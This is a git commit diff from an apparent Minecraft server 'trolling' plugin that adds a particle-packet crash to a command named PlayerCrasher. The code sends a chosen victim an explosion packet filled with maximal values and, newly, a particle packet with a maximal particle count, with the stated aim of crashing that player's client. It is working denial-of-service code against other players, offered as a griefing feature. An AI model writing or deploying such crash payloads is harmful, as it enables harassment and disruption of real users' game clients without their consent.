648775119c5fa38cb3c5ec518cc89d6f1a822199
Pascal Bartusek <Pascal Bartusek@DESKTOP-B8URSDR.Speedport_W_724V_09011603_05_017>
2019-05-13 20:23:03 +0200

    Added Particle Packet crasher

--- src/net/Lenni0451/GitTroll/command/commands/trolling/PlayerCrasher.java
+++ src/net/Lenni0451/GitTroll/command/commands/trolling/PlayerCrasher.java
@@ -6,7 +6,9 @@ import java.util.List;
 import net.Lenni0451.GitTroll.command.CommandBase;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
+import net.minecraft.server.v1_8_R3.EnumParticle;
 import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
+import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
 import net.minecraft.server.v1_8_R3.Vec3D;
 
 public class PlayerCrasher extends CommandBase {
@@ -21,7 +23,9 @@ public class PlayerCrasher extends CommandBase {
 		if(args.isLength(1)) {
 			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
 			
-			vic.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
+			vic.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
+			vic.sendPacket(new PacketPlayOutWorldParticles(EnumParticle.PORTAL, true, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, Integer.MAX_VALUE, Integer.MAX_VALUE));
+			
 			executor.sendGitMessage("The player has been crashed.");
 		} else {
 			this.commandWrong();
